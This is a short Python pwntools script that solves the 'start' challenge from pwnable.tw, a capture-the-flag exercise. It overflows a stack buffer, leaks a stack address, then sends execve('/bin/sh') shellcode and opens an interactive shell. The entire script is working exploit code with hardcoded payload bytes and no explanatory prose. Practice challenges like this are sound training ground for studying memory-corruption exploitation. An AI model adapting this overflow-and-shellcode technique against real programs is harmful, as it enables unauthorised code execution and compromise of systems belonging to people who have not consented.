from pwn import *

p = process('./start')

#p = remote('chall.pwnable.tw',10000)

#execve('/bin/sh')
# xor edx,edx
# xor ecx,ecx
# push ecx
# push 0x68732f2f ;; hs//
# push 0x6e69622f ;; nib/
# mov ebx,esp
# mov al,11
# int 0x80

sh="\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

reread = 0x08048087 # mov ecx,esp

payload1 = 'A'*20+p32(reread)

raw_input()

p.send(payload1)

p.recvuntil("Let's start the CTF:")

stack_esp = u32(p.recv(4))
print 'stack addr'+hex(stack_esp)

off_of_sh = 20  #stack_esp offset sh

payload2 = 'A'*20+p32(stack_esp+off_of_sh)+sh


p.send(payload2)

p.interactive()